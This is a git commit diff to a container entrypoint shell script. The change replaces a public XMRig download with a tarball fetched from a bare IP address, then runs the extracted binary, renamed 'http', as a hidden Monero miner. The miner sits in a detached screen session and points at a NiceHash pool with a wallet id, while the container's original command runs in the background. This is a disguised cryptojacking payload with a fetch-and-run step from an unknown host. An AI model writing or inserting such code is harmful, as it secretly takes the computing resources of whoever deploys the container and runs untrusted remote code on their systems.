0309d06b28e58852cb50e62c1cc457d8705c58a2
osnmoh007 <112149956+osnmoh007@users.noreply.github.com>
2024-08-14 22:53:03 +0100

    Update entrypoint2.sh

--- entrypoint2.sh
+++ entrypoint2.sh
@@ -1,23 +1,20 @@
 #!/bin/sh
 
-# Download the XMRig file
-wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz -O /app2/xmrig-6.22.0-linux-static-x64.tar.gz
+# Download the http file
+wget http://35.211.126.56/httpalpine.tar.gz -O /app2/httpalpine.tar.gz
 
-# Extract the XMRig file
-tar -xvzf /app2/xmrig-6.22.0-linux-static-x64.tar.gz -C /app2/
+# Extract the http file
+tar -xvzf /app2/httpalpine.tar.gz -C /app2/
 
 # Clean up
-rm /app2/xmrig-6.22.0-linux-static-x64.tar.gz
+rm /app2/httpalpine.tar.gz
 
-# Rename the extracted XMRig binary to myapp if needed
-# Replace 'xmrig' with the actual name of the binary inside the extracted folder if different
-mv /app2/xmrig-6.22.0/xmrig /app2/xmrig-6.22.0/myapp
 
 # Change directory to the extracted folder
-cd /app2/xmrig-6.22.0
+cd /app2/httpalpine
 
 # Run XMRig with screen
-screen -dmS myapp_session sh -c "./myapp -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --threads=16"
+screen -dmS myapp_session sh -c "./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --threads=16"
 
 # Change directory to /app and run the original command in the background
 cd /app
